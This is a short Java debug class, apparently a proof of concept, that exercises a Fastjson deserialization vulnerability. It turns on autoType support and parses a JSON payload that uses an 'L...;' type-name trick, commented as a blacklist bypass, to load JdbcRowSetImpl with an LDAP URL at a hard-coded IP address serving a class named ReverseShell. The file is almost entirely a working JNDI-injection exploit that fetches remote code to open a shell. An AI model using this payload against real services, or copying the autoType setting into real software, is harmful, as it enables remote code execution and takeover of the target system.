package com.sorry.bug;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * created by 0x22cb7139 on 2021/4/15
 */
public class Debug {
    public static void main(String[] args) {
        //开启autotypesupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //黑名单绕过
        String expstr = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://103.133.176.97:1389/ReverseShell\", \"autoCommit\":true}";
        JSON.parseObject(expstr);
    }
}